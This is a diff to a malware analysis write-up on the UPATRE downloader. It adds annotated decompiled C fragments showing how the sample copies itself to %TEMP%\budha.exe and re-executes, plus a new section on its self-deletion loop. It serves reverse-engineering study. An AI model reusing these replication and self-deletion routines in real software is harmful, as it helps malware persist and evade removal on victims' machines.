@@ -4,7 +4,9 @@ Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via 
 
 Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
 
-## Downloader - Replication
+All of the interesting functionality occurs within the entry point, starting with code that rewrites and executes the file under %TEMP%
+## Downloader
+**Replication**
 ```C
  GetModuleHandleW(0);
   hHeap = HeapCreate(0, 0x2000u, 0);
@@ -27,12 +29,12 @@ Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
   if ( lstrcmpW(v0, lpBuffer) ) // Execute if statement only if the current executing process is not %TEMP%\budha.exe
   {
     v5 = lstrlenW(v0);
-    sub_401000((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2);
-    hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0);
-    if ( hHeap == (HANDLE)-1 )
-      return 1;
+    sub_401000((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2); // Appends the executing path [v0] to the end of the in-memory PE buffer [v31 + nNumberOfBytesToRead]
+    hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0); // 0x40000000 = GENERIC_WRITE, 2 = FILE_SHARE_WRITE, 2 = CREATE_ALWAYS [Overwrite if exists]
+    if ( hHeap == (HANDLE)-1 ) // If the handle creation failed...
+      return 1; // Return to the calling process
     v6 = lstrlenW(v0);
-    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0); // Write the current executing process to %TEMP%\budha.exe
+    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0); // Write the current executing process to %TEMP%\budha.exe + append metadata of original execution path [v0 [Path] + 2 * v6 + 4 [Length]
     CloseHandle(hFile);
     CloseHandle(hHeap); // Close both handles to the current process
     GetTempPathW(0x1000u, v0);
@@ -41,7 +43,19 @@ LABEL_8:
     ExitProcess(0);
   }
 ```
-
+**Self-Deletion**
+Next, when the binary is executing from %TEMP%, it will attempt to delete itself from it's "original" location
+```C
+  }
+  v7 = (char *)v31 + 40 * *(unsigned __int16 *)((char *)v31 + *((_DWORD *)v31 + 15) + 6) + *((_DWORD *)v31 + 15) + 208;
+  v8 = (const WCHAR *)((char *)v31 + *((_DWORD *)v7 + 4) + *((_DWORD *)v7 + 5));
+  CloseHandle(hFile);
+  for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead <= 20000; ++nNumberOfBytesToRead )
+  {
+    if ( DeleteFileW(v8) )
+      break;
+  }
+```
 
 
 
